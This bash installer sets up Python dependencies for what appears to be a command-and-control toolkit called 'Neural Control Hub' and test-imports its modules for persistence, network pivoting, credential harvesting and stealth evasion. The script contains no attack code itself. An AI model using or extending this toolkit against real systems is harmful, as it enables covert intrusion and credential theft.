#!/bin/bash
# Advanced Features Installation Script

echo "╔════════════════════════════════════════════════════════════════════════════╗"
echo "║     Neural Control Hub - Advanced Edition Installation                     ║"
echo "╚════════════════════════════════════════════════════════════════════════════╝"
echo ""

# Check Python version
PYTHON_CMD=""
if command -v python3 &> /dev/null; then
    PYTHON_CMD="python3"
elif command -v python &> /dev/null; then
    PYTHON_CMD="python"
else
    echo "❌ Error: Python not found. Please install Python 3.8+"
    exit 1
fi

echo "✓ Found Python: $PYTHON_CMD"

# Check pip
if ! $PYTHON_CMD -m pip --version &> /dev/null; then
    echo "❌ Error: pip not found. Please install pip"
    exit 1
fi

echo "✓ Found pip"
echo ""

# Install dependencies
echo "📦 Installing advanced dependencies..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# Core dependencies
$PYTHON_CMD -m pip install --upgrade pip

# Install from requirements.txt
if [ -f "requirements.txt" ]; then
    echo "Installing from requirements.txt..."
    $PYTHON_CMD -m pip install -r requirements.txt
else
    echo "⚠️  requirements.txt not found, installing manually..."
    
    # Install core packages
    $PYTHON_CMD -m pip install \
        flask>=2.3.2 \
        flask-socketio>=5.5.1 \
        flask-cors>=4.0.0 \
        eventlet==0.33.3 \
        gunicorn>=23.0.0 \
        python-socketio>=5.13.0 \
        websockets>=10.4 \
        requests>=2.32.4 \
        cryptography>=41.0.3 \
        numpy>=1.24.4 \
        scikit-learn>=1.3.0 \
        pandas>=2.0.0 \
        psutil>=5.9.5 \
        paramiko>=3.3.1
fi

echo ""
echo "✅ Dependencies installed successfully!"
echo ""

# Test installation
echo "🧪 Testing advanced modules..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# Run quick tests
echo "Testing AI Detection..."
$PYTHON_CMD -c "from advanced_ai_detection import init_threat_detector; print('✓ AI Detection OK')" 2>&1 | grep -v "Warning"

echo "Testing Encryption..."
$PYTHON_CMD -c "from advanced_crypto_channel import AdvancedCryptoChannel; print('✓ Encryption OK')" 2>&1 | grep -v "Warning"

echo "Testing Persistence..."
$PYTHON_CMD -c "from advanced_persistence import AdvancedPersistenceManager; print('✓ Persistence OK')" 2>&1 | grep -v "Warning"

echo "Testing Network Pivoting..."
$PYTHON_CMD -c "from advanced_network_pivoting import AdvancedNetworkPivot; print('✓ Network Pivoting OK')" 2>&1 | grep -v "Warning"

echo "Testing Credential Harvesting..."
$PYTHON_CMD -c "from advanced_credential_harvester import AdvancedCredentialHarvester; print('✓ Credential Harvesting OK')" 2>&1 | grep -v "Warning"

echo "Testing Stealth & Evasion..."
$PYTHON_CMD -c "from advanced_stealth_evasion import AdvancedStealthManager; print('✓ Stealth & Evasion OK')" 2>&1 | grep -v "Warning"

echo "Testing Dashboard Integration..."
$PYTHON_CMD -c "from advanced_dashboard_integration import AdvancedDashboardIntegration; print('✓ Dashboard Integration OK')" 2>&1 | grep -v "Warning"

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "🎉 Installation Complete!"
echo ""
echo "📚 Next Steps:"
echo "   1. Review ADVANCED_FEATURES.md for comprehensive documentation"
echo "   2. Check QUICK_REFERENCE.md for quick start examples"
echo "   3. Run: $PYTHON_CMD test_advanced_features.py"
echo "   4. Integrate with controller (see UPGRADE_SUMMARY.md)"
echo ""
echo "🚀 Advanced Features Ready!"
echo ""
